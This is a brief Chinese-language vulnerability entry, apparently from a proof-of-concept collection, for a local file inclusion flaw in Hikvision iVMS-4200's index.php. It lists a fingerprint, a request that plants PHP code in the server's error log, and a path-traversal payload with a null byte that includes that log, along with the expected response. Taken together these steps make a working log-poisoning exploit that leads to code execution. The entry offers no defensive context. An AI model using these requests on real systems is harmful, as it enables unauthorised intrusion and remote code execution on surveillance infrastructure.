# 海康威视iVMS4200index.php存在本地文件包含漏洞

海康 ｜ 文件包含 ｜ —
- **指纹**：`body="<div class=\"`
- **请求**：`GET /%3C%3Fphp%20echo%20md5(123)%3F%3E HTTP/1.1`

**Payload**
```
文件包含日志文件
GET /index.php?controller=../../../../Server/logs/error.log%00.php HTTP/1.1
Host:
```
- **响应特征**：200